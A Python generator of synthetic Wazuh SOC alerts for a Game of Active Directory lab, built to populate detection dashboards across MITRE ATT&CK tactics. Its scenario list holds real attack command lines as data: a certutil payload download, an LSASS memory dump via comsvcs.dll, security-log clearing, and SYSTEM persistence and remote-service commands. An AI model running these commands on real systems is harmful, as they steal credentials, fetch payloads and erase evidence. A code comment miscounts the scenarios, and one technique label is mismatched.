"""Synthetic SOC Wazuh Alerts events (rule engine + MITRE + FIM/syscheck).

Emits Wazuh 4.x ``wazuh-alerts`` documents matching the canonical schema in
``scripts/logsources/wazuh_sources.py`` (``WAZUH_ALERTS_EXAMPLE`` /
``WAZUH_ALERTS_FIELD_MAPPINGS``). The corpus models a GOAD (Game of Active
Directory) lab where a Wazuh manager ``oci-wazuh-demo-wazuh-aio`` forwards
endpoint telemetry from the seven-kingdoms.local domain to OCI Log Analytics.

Coverage spans every ATT&CK tactic the GOAD detection rules exercise so the
Wazuh dashboards light up: Initial Access, Execution, Persistence, Privilege
Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement,
and Command and Control. A slice of FIM/syscheck (file-integrity) events is
included with ``syscheck.path``/``event``/``sha256_after``.
"""
import hashlib
import os
import random
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from testlogs.common import *  # noqa: F401,F403

# ─── GOAD lab agents (RFC1918 192.168.56.0/24 — synthetic lab range) ──────────
WAZUH_MANAGER = "oci-wazuh-demo-wazuh-aio"
WAZUH_AGENTS = [
    # (id, name, ip, computer FQDN)
    ("004", "winterfell", "192.168.56.11", "winterfell.north.sevenkingdoms.local"),
    ("003", "kingslanding", "192.168.56.10", "kingslanding.sevenkingdoms.local"),
    ("005", "meereen", "192.168.56.12", "meereen.essos.local"),
    ("002", "castelblack", "192.168.56.22", "castelblack.north.sevenkingdoms.local"),
    ("006", "braavos", "192.168.56.23", "braavos.essos.local"),
]
WAZUH_AGENT_BY_NAME = {a[1]: a for a in WAZUH_AGENTS}

# Domain users seen across the GOAD kill chain.
GOAD_USERS = [
    "NORTH\\arya.stark", "NORTH\\jon.snow", "NORTH\\eddard.stark",
    "SEVENKINGDOMS\\joffrey.baratheon", "SEVENKINGDOMS\\robert.baratheon",
    "ESSOS\\daenerys.targaryen", "ESSOS\\khal.drogo",
    "NORTH\\sql_svc", "SEVENKINGDOMS\\Administrator", "NT AUTHORITY\\SYSTEM",
]


def _sha256(seed):
    return hashlib.sha256(seed.encode()).hexdigest()


def _alert(*, agent, offset, rule_id, level, description, groups, mitre,
           decoder="windows_eventchannel", event_id=None, channel=None,
           provider=None, image=None, command_line=None, target_filename="",
           user=None, process_id=None, rule_name=None, full_log=None,
           syscheck=None):
    """Assemble a single wazuh-alerts document matching WAZUH_ALERTS_EXAMPLE."""
    agent_id, agent_name, agent_ip, computer = agent
    mitre_ids, mitre_tactics, mitre_techniques = mitre
    doc = {
        "timestamp": ts(offset),
        "agent": {"id": agent_id, "name": agent_name, "ip": agent_ip},
        "manager": {"name": WAZUH_MANAGER},
        "rule": {
            "id": str(rule_id),
            "level": level,
            "description": description,
            "groups": groups,
            "mitre": {
                "id": mitre_ids,
                "tactic": mitre_tactics,
                "technique": mitre_techniques,
            },
        },
        "decoder": {"name": decoder},
        "full_log": full_log or description + " on " + agent_name,
    }
    if syscheck is not None:
        doc["syscheck"] = syscheck
    else:
        doc["data"] = {
            "win": {
                "system": {
                    "eventID": str(event_id if event_id is not None else 1),
                    "channel": channel or "Microsoft-Windows-Sysmon/Operational",
                    "providerName": provider or "Microsoft-Windows-Sysmon",
                    "computer": computer,
                },
                "eventdata": {
                    "image": image or "C:\\Windows\\System32\\cmd.exe",
                    "commandLine": command_line or "",
                    "targetFilename": target_filename,
                    "user": user or random.choice(GOAD_USERS),
                    "processId": str(process_id if process_id is not None
                                     else random.randint(2000, 9000)),
                    "ruleName": rule_name or "",
                },
            }
        }
    return doc


# ─── Per-tactic alert templates (rule_id, level, desc, groups, mitre, kwargs) ─
# mitre is (ids[], tactics[], techniques[]) following the source-doc arrays.

def _mitre(ids, tactics, techniques):
    return (ids, tactics, techniques)


# Scenario catalog: a deterministic, hand-crafted GOAD kill chain. Each entry is
# replayed across the requested agents so every tactic appears for multiple hosts.
ALERT_SCENARIOS = [
    # Initial Access — valid accounts / RDP brute then logon.
    dict(rule_id=92657, level=8, description="Multiple failed logon attempts followed by a success (possible password spray)",
         groups=["windows", "authentication_failures", "attack"],
         mitre=_mitre(["T1078"], ["Initial Access"], ["Valid Accounts"]),
         event_id=4625, channel="Security", provider="Microsoft-Windows-Security-Auditing",
         image="C:\\Windows\\System32\\lsass.exe",
         command_line="", user="SEVENKINGDOMS\\joffrey.baratheon",
         rule_name="technique_id=T1078,technique_name=Valid Accounts"),

    # Execution — cmd spawned by abnormal parent.
    dict(rule_id=92052, level=4, description="Windows command prompt started by an abnormal process",
         groups=["windows", "sysmon", "attack"],
         mitre=_mitre(["T1059.003"], ["Execution"], ["Windows Command Shell"]),
         event_id=1, image="C:\\Windows\\System32\\cmd.exe",
         command_line="cmd.exe /c whoami /all", user="NORTH\\arya.stark",
         rule_name="technique_id=T1059.003,technique_name=Windows Command Shell"),

    # Execution — PowerShell encoded command.
    dict(rule_id=92033, level=9, description="PowerShell executed an encoded command",
         groups=["windows", "sysmon", "powershell", "attack"],
         mitre=_mitre(["T1059.001"], ["Execution"], ["PowerShell"]),
         event_id=1, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         command_line="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
         user="NORTH\\jon.snow",
         rule_name="technique_id=T1059.001,technique_name=PowerShell"),

    # Command and Control / Ingress Tool Transfer — certutil download.
    dict(rule_id=92011, level=10, description="Suspicious download via certutil (ingress tool transfer)",
         groups=["windows", "sysmon", "attack"],
         mitre=_mitre(["T1105"], ["Command and Control"], ["Ingress Tool Transfer"]),
         event_id=1, image="C:\\Windows\\System32\\certutil.exe",
         command_line="certutil.exe -urlcache -split -f http://192.168.56.1/m.exe C:\\Users\\Public\\m.exe",
         user="NORTH\\arya.stark",
         rule_name="technique_id=T1105,technique_name=Ingress Tool Transfer"),

    # Persistence — scheduled task creation.
    dict(rule_id=92216, level=8, description="Scheduled task created (possible persistence)",
         groups=["windows", "sysmon", "attack"],
         mitre=_mitre(["T1053.005"], ["Persistence"], ["Scheduled Task"]),
         event_id=1, image="C:\\Windows\\System32\\schtasks.exe",
         command_line="schtasks /create /tn UpdateCheck /tr C:\\Users\\Public\\m.exe /sc minute /mo 5 /ru SYSTEM",
         user="SEVENKINGDOMS\\Administrator",
         rule_name="technique_id=T1053.005,technique_name=Scheduled Task"),

    # Lateral Movement / Lateral Tool Transfer — SMB copy + service exec.
    dict(rule_id=92313, level=10, description="Remote service created over SMB (lateral movement)",
         groups=["windows", "sysmon", "attack"],
         mitre=_mitre(["T1570"], ["Lateral Movement"], ["Lateral Tool Transfer"]),
         event_id=1, image="C:\\Windows\\System32\\sc.exe",
         command_line="sc \\\\kingslanding create svc binPath= C:\\Windows\\m.exe start= auto",
         user="NORTH\\sql_svc",
         rule_name="technique_id=T1570,technique_name=Lateral Tool Transfer"),

    # Defense Evasion — obfuscated/packed binary via software packing.
    dict(rule_id=92500, level=9, description="Process image is software-packed/obfuscated (defense evasion)",
         groups=["windows", "sysmon", "attack"],
         mitre=_mitre(["T1027.004"], ["Defense Evasion"], ["Compile After Delivery"]),
         event_id=1, image="C:\\Windows\\Temp\\packed_loader.exe",
         command_line="C:\\Windows\\Temp\\packed_loader.exe -k aes",
         user="NORTH\\arya.stark",
         rule_name="technique_id=T1027.004,technique_name=Compile After Delivery"),

    # Defense Evasion — clear event log.
    dict(rule_id=92905, level=12, description="Windows Security event log was cleared",
         groups=["windows", "security", "attack"],
         mitre=_mitre(["T1070.001"], ["Defense Evasion"], ["Clear Windows Event Logs"]),
         event_id=1102, channel="Security", provider="Microsoft-Windows-Eventlog",
         image="C:\\Windows\\System32\\wevtutil.exe",
         command_line="wevtutil cl Security",
         user="SEVENKINGDOMS\\Administrator",
         rule_name="technique_id=T1070.001,technique_name=Clear Windows Event Logs"),

    # Discovery — system owner/user discovery.
    dict(rule_id=92044, level=3, description="System owner/user discovery command executed",
         groups=["windows", "sysmon", "discovery"],
         mitre=_mitre(["T1033"], ["Discovery"], ["System Owner/User Discovery"]),
         event_id=1, image="C:\\Windows\\System32\\whoami.exe",
         command_line="whoami /groups", user="NORTH\\jon.snow",
         rule_name="technique_id=T1033,technique_name=System Owner/User Discovery"),

    # Privilege Escalation / Defense Evasion — GPO modification.
    dict(rule_id=92700, level=11, description="Group Policy object modified (domain policy tampering)",
         groups=["windows", "security", "attack"],
         mitre=_mitre(["T1484"], ["Privilege Escalation"], ["Domain Policy Modification"]),
         event_id=5136, channel="Security", provider="Microsoft-Windows-Security-Auditing",
         image="C:\\Windows\\System32\\mmc.exe",
         command_line="mmc.exe gpedit.msc",
         user="SEVENKINGDOMS\\Administrator",
         rule_name="technique_id=T1484,technique_name=Domain Policy Modification"),

    # Credential Access — Kerberoasting (TGS request, RC4).
    dict(rule_id=92800, level=12, description="Kerberos service ticket requested with weak RC4 encryption (Kerberoasting)",
         groups=["windows", "security", "attack"],
         mitre=_mitre(["T1558.003"], ["Credential Access"], ["Kerberoasting"]),
         event_id=4769, channel="Security", provider="Microsoft-Windows-Security-Auditing",
         image="C:\\Windows\\System32\\lsass.exe",
         command_line="", user="NORTH\\arya.stark",
         rule_name="technique_id=T1558.003,technique_name=Kerberoasting"),

    # Credential Access — DCSync (directory service replication).
    dict(rule_id=92810, level=14, description="Directory replication requested by a non-DC account (possible DCSync)",
         groups=["windows", "security", "attack"],
         mitre=_mitre(["T1003.006"], ["Credential Access"], ["DCSync"]),
         event_id=4662, channel="Security", provider="Microsoft-Windows-Security-Auditing",
         image="C:\\Windows\\System32\\lsass.exe",
         command_line="", user="NORTH\\arya.stark",
         rule_name="technique_id=T1003.006,technique_name=DCSync"),

    # Credential Access — LSASS memory dump.
    dict(rule_id=92820, level=13, description="LSASS process memory accessed (credential dumping)",
         groups=["windows", "sysmon", "attack"],
         mitre=_mitre(["T1003.001"], ["Credential Access"], ["LSASS Memory"]),
         event_id=10, image="C:\\Windows\\System32\\rundll32.exe",
         command_line="rundll32.exe comsvcs.dll MiniDump 712 C:\\Users\\Public\\lsass.dmp full",
         user="SEVENKINGDOMS\\Administrator",
         rule_name="technique_id=T1003.001,technique_name=LSASS Memory"),

    # Lateral Movement — Pass-the-Hash / alternate auth material.
    dict(rule_id=92830, level=12, description="NTLM logon using alternate authentication material (Pass-the-Hash)",
         groups=["windows", "security", "attack"],
         mitre=_mitre(["T1550.002"], ["Lateral Movement"], ["Pass the Hash"]),
         event_id=4624, channel="Security", provider="Microsoft-Windows-Security-Auditing",
         image="C:\\Windows\\System32\\lsass.exe",
         command_line="", user="SEVENKINGDOMS\\Administrator",
         rule_name="technique_id=T1550.002,technique_name=Pass the Hash"),
]


def _fim_event(*, agent, offset, path, fim_event, level=7,
               description="File integrity monitoring alert"):
    """Build a syscheck/FIM alert variant (no data.win envelope)."""
    sha = _sha256(path + fim_event)
    groups = ["ossec", "syscheck", "attack"]
    mitre = _mitre(["T1543.003"], ["Persistence"], ["Windows Service"])
    return _alert(
        agent=agent, offset=offset, rule_id=550, level=level,
        description=description, groups=groups, mitre=mitre,
        decoder="syscheck_integrity_changed",
        full_log=f"FIM {fim_event} {path} on {agent[1]}",
        syscheck={"path": path, "event": fim_event, "sha256_after": sha},
    )


FIM_PATHS = [
    ("C:\\Windows\\System32\\drivers\\etc\\hosts", "modified"),
    ("C:\\Windows\\System32\\Tasks\\UpdateCheck", "added"),
    ("C:\\Users\\Public\\m.exe", "added"),
    ("C:\\Windows\\Temp\\packed_loader.exe", "added"),
    ("C:\\Windows\\System32\\config\\SAM", "modified"),
    ("C:\\Windows\\System32\\GroupPolicy\\gpt.ini", "modified"),
]


def generate_wazuh_alerts_events():
    """Generate the SOC Wazuh Alerts corpus (~400+ events across GOAD hosts)."""
    events = []
    offset = 0

    # Replay every tactic scenario across the two primary GOAD hosts plus a
    # rotating tertiary host, so each tactic appears multiple times per host.
    primary = [WAZUH_AGENT_BY_NAME["winterfell"], WAZUH_AGENT_BY_NAME["kingslanding"]]
    tertiary = [WAZUH_AGENT_BY_NAME[n] for n in ("meereen", "castelblack", "braavos")]

    for repeat in range(11):  # 11 * 13 scenarios * (2 + 1) agents ~= 429 alerts
        agents_this_round = primary + [tertiary[repeat % len(tertiary)]]
        for scenario in ALERT_SCENARIOS:
            for agent in agents_this_round:
                offset += 1
                events.append(_alert(agent=agent, offset=offset, **scenario))

    # FIM / syscheck slice across hosts.
    for repeat in range(4):
        for path, fim in FIM_PATHS:
            agent = WAZUH_AGENTS[(repeat + FIM_PATHS.index((path, fim))) % len(WAZUH_AGENTS)]
            offset += 1
            events.append(_fim_event(agent=agent, offset=offset, path=path, fim_event=fim))

    random.shuffle(events)
    return events
